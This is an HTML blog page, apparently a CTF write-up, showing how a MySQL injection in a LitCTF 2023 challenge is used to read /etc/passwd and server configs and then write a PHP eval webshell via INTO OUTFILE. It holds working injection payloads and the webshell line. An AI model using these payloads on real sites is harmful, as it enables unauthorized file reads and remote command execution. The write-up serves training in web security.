@@ -1,0 +1,520 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>MySQL注入实现getshell | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-number">4.</span> <span class="toc-text">操作</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>MySQL注入实现getshell</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/5/23
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Sql/" style="color: #ff7d73">Sql</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.4k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">8分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看到<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3868">[LitCTF 2023]这是什么？SQL ！注一下 ！</a>这题的<a target="_blank" rel="noopener" href="https://www.nssctf.cn/note/set/2169">wp</a>中出现了这种解法，顺手记下来</p>
+<span id="more"></span>
+
+<hr>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>使用 MySQL 中的<code>outfile</code>方法，构造 sql 语句写入webshell，通过参数执行系统命令</p>
+<h1 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h1><ul>
+<li>具有目录写权限</li>
+<li>知道网站根目录绝对路径</li>
+<li><code>secure_file_priv</code>为空或指定目录在网站目录下</li>
+<li>php gpc 关闭</li>
+</ul>
+<hr>
+<h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>题目sql语句</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT username,password FROM users WHERE id = "</span><span class="token operator">.</span><span class="token string single-quoted-string">'(((((('</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'))))))'</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<ol>
+<li><p>常规注入读文件(题目是闭合)</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>返回&#x2F;etc&#x2F;passwd的文件内容</p>
+<pre class="line-numbers language-none"><code class="language-none">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash
+bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin
+daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin
+adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin
+lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin
+sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync
+shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown
+halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt
+mail:x:8:12:mail:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin
+news:x:9:13:news:&#x2F;usr&#x2F;lib&#x2F;news:&#x2F;sbin&#x2F;nologin
+uucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucppublic:&#x2F;sbin&#x2F;nologin
+operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin
+man:x:13:15:man:&#x2F;usr&#x2F;man:&#x2F;sbin&#x2F;nologin
+postmaster:x:14:12:postmaster:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin
+cron:x:16:16:cron:&#x2F;var&#x2F;spool&#x2F;cron:&#x2F;sbin&#x2F;nologin
+ftp:x:21:21::&#x2F;var&#x2F;lib&#x2F;ftp:&#x2F;sbin&#x2F;nologin
+sshd:x:22:22:sshd:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin
+at:x:25:25:at:&#x2F;var&#x2F;spool&#x2F;cron&#x2F;atjobs:&#x2F;sbin&#x2F;nologin
+squid:x:31:31:Squid:&#x2F;var&#x2F;cache&#x2F;squid:&#x2F;sbin&#x2F;nologin
+xfs:x:33:33:X Font Server:&#x2F;etc&#x2F;X11&#x2F;fs:&#x2F;sbin&#x2F;nologin
+games:x:35:35:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin
+cyrus:x:85:12::&#x2F;usr&#x2F;cyrus:&#x2F;sbin&#x2F;nologin
+vpopmail:x:89:89::&#x2F;var&#x2F;vpopmail:&#x2F;sbin&#x2F;nologin
+ntp:x:123:123:NTP:&#x2F;var&#x2F;empty:&#x2F;sbin&#x2F;nologin
+smmsp:x:209:209:smmsp:&#x2F;var&#x2F;spool&#x2F;mqueue:&#x2F;sbin&#x2F;nologin
+guest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin
+nobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologin
+www-data:x:82:82:Linux User,,,:&#x2F;home&#x2F;www-data:&#x2F;sbin&#x2F;nologin
+mysql:x:100:101:mysql:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;sbin&#x2F;nologin
+nginx:x:101:102:nginx:&#x2F;var&#x2F;lib&#x2F;nginx:&#x2F;sbin&#x2F;nologin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>读取nginx配置文件，寻找网站根目录</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'/etc/nginx/nginx.conf'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>返回</p>
+<pre class="line-numbers language-none"><code class="language-none">Array ( [0] &#x3D;&gt; Array ( [username] &#x3D;&gt; daemon off; worker_processes auto; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log warn; events &#123; worker_connections 1024; &#125; http &#123; include &#x2F;etc&#x2F;nginx&#x2F;mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; server &#123; listen 80; server_name localhost; root &#x2F;var&#x2F;www&#x2F;html; index index.php; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; location &#x2F; &#123; try_files $uri $uri&#x2F; &#x2F;index.php?$args; &#125; location ~ \.php$ &#123; try_files $uri &#x3D;404; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; &#125; &#125; &#125; [password] &#x3D;&gt; 2 ) )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li><p>读取首页</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'/var/www/html/index.php'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>返回</p>
+<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">Array
+(
+    [0] &#x3D;&gt; Array
+        (
+            [username] &#x3D;&gt; &lt;?php
+    error_reporting(0);
+  include &quot;connect.php&quot;;
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
+    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0, shrink-to-fit&#x3D;no&quot;&gt;
+    &lt;title&gt;狠狠的注入涅~&lt;&#x2F;title&gt;
+    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;assets&#x2F;bootstrap&#x2F;css&#x2F;bootstrap.min.css&quot;&gt;
+    &lt;link rel&#x3D;&quot;stylesheet&quot;
+        href&#x3D;&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;css?family&#x3D;Lato:300,400,700,300italic,400italic,700italic&amp;display&#x3D;swap&quot;&gt;
+&lt;&#x2F;head&gt;
+&lt;body&gt;
+    &lt;header class&#x3D;&quot;text-center text-white masthead&quot;
+        style&#x3D;&quot;background:url(&#39;https:&#x2F;&#x2F;www.dmoe.cc&#x2F;random.php&#39;)no-repeat center center;background-size:cover;&quot;&gt;
+        &lt;div class&#x3D;&quot;overlay&quot;&gt;&lt;&#x2F;div&gt;
+        &lt;div class&#x3D;&quot;container&quot;&gt;
+            &lt;div class&#x3D;&quot;row&quot;&gt;
+                &lt;div class&#x3D;&quot;col-xl-9 mx-auto position-relative&quot;&gt;
+                    &lt;h1 class&#x3D;&quot;mb-5&quot;&gt;Search what you want to search&lt;&#x2F;h1&gt;
+                &lt;&#x2F;div&gt;
+                &lt;div class&#x3D;&quot;col-md-10 col-lg-8 col-xl-7 mx-auto position-relative&quot;&gt;
+                    &lt;form method&#x3D;&quot;get&quot; action&#x3D;&quot;&quot;&gt;
+                        &lt;div class&#x3D;&quot;row&quot;&gt;
+                            &lt;div class&#x3D;&quot;col-12 col-md-9 mb-2 mb-md-0&quot;&gt;
+                                &lt;input class&#x3D;&quot;form-control form-control-lg&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;id&quot;
+                                    placeholder&#x3D;&quot;Enter your id to start&quot;&gt;
+                            &lt;&#x2F;div&gt;
+                            &lt;div class&#x3D;&quot;col-12 col-md-3&quot;&gt;
+                                &lt;button class&#x3D;&quot;btn btn-primary btn-lg&quot; type&#x3D;&quot;submit&quot;&gt;姨妈大！&lt;&#x2F;button&gt;
+                            &lt;&#x2F;div&gt;
+                        &lt;&#x2F;div&gt;
+                    &lt;&#x2F;form&gt;
+                &lt;&#x2F;div&gt;
+            &lt;&#x2F;div&gt;
+        &lt;&#x2F;div&gt;
+    &lt;&#x2F;header&gt;
+&lt;section class&#x3D;&quot;text-center bg-light features-icons&quot;&gt;
+    &lt;div class&#x3D;&quot;container&quot;&gt;
+        &lt;div class&#x3D;&quot;row&quot;&gt;
+            &lt;div class&#x3D;&quot;col-md-6&quot;&gt; 
+                &lt;h5&gt;Key Source&lt;&#x2F;h5&gt;
+                &lt;pre&gt;&lt;?php highlight_file(source) ?&gt;&lt;&#x2F;pre&gt;
+            &lt;&#x2F;div&gt;
+            &lt;div class&#x3D;&quot;col-md-6&quot;&gt; 
+                &lt;?php
+                
+                $sql &#x3D; &quot;SELECT username,password FROM users WHERE id &#x3D; &quot;.&#39;((((((&#39;.$_GET[&quot;id&quot;].&#39;))))))&#39;;
+                echo &quot;&lt;h5&gt;Executed Operations:&lt;&#x2F;h5&gt;&quot;
+                    .$sql
+                    .&quot;&lt;br&gt;&lt;br&gt;&quot;;
+                $result &#x3D; $conn-&gt;query($sql);
+                if ($result-&gt;num_rows &gt; 0) &#123;
+                        print_r(mysqli_fetch_all($result, MYSQLI_ASSOC));
+                &#125; else &#123;
+                    echo &quot;0 results&quot;;
+                &#125;
+                ?&gt;
+            &lt;&#x2F;div&gt;
+        &lt;&#x2F;div&gt;
+    &lt;&#x2F;div&gt;
+&lt;&#x2F;section&gt;
+    &lt;section class&#x3D;&quot;showcase&quot;&gt;
+        &lt;div class&#x3D;&quot;container-fluid p-0&quot;&gt;
+            &lt;div class&#x3D;&quot;row g-0&quot;&gt;&lt;&#x2F;div&gt;
+        &lt;&#x2F;div&gt;
+    &lt;&#x2F;section&gt;
+    &lt;script src&#x3D;&quot;assets&#x2F;bootstrap&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;
+            [password] &#x3D;&gt; 2
+        )
+)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>写入php探针</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo();?>'</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/info.php'</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>访问对应url&#x2F;info.php，若出现phpinfo环境页面则证明写入成功</p>
+</li>
+<li><p>写入webshell</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token string">'&lt;?php eval($_POST["cmd"]);?>'</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/shell.php'</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>蚁剑连接对应url&#x2F;shell.php即可,密码cmd</p>
+</li>
+</ol>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
